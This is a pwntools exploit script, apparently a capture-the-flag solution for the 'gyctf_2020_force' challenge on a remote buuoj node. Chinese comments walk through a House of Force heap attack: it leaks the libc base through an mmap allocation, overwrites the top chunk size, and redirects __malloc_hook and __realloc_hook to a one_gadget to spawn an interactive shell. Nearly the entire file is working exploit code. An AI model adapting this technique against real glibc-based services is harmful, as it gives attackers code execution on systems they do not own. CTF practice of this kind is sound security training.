# coding:utf-8
from pwn import *

proc_name = 'gyctf_2020_force'
islocal = 0
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
# libc = ELF("/home/klose/ctf/pwn/libc-database/db/libc6_2.23-0ubuntu11.2_amd64.so")
elf = ELF(proc_name)

if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 28493)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))


def add(size, content):
    p.recvuntil("puts")
    p.sendline("1")
    p.sendlineafter("size", str(size))
    p.recvuntil('0x')
    heap_ptr = int(p.recvuntil("\n")[:12],16)
    log.success('heap_ptr => ' + hex(heap_ptr))
    p.sendafter("content", content)
    return heap_ptr

def pwn():
    # 申请一个极大的堆块，glibc调用mmap进行分配，从而获得libc上的地址，以此可以获得libc的基地址
    libc_base = add(0x300000, 'a\n') + 0x300ff0
    # 将top chunk size修改为一个很大的值，目的是绕过检测：用户请求的大小和top chunk现有的大小
    # 这样就可以malloc一个很大的chunk
    heap_ptr = add(0x18, b"a" * 0x10 + p64(0) + p64(0xffffffffffffffff))     
    top_chunk_ptr = heap_ptr + 0x10             # top chunk ptr

    # leak data
    __malloc_hook = libc_base + libc.sym['__malloc_hook']
    __libc_realloc = libc_base + libc.sym['__libc_realloc']    
    one_gadget = libc_base + 0x4527a            # local
    # one_gadget = libc_base + 0x4526a
    log.success('libc_base => ' + hex(libc_base))
    log.success('top_chunk => ' + hex(top_chunk_ptr))
    log.success('__malloc_hook => ' + hex(__malloc_hook))
    log.success('__libc_realloc => ' + hex(__libc_realloc))
    log.success('one_gadget => ' + hex(one_gadget))

    offset = __malloc_hook - top_chunk_ptr
    # 申请一个大堆块，目的是控制top chunk ptr，使得堆块覆盖包含malloc_hook的地址，可以修改malloc_hook的内容
    log.info('offset => ' + hex(offset))
    add(offset - 0x33, b'bbb\n')       # 调试调整偏移值，方便malloc chunk来overwrite
    # __realloc_hook => one_gadget
    # __malloc_hook => __libc_realloc
    add(0x20, p64(0) + p64(one_gadget) + p64(__libc_realloc + 0x10))

    # malloc new chunk to trigger __malloc_hook -> __libc_realloc -> one_gadget
    p.sendlineafter("puts\n", '1')
    p.sendlineafter("size\n", '0x10')

    p.interactive()
if __name__ == '__main__':
    pwn()

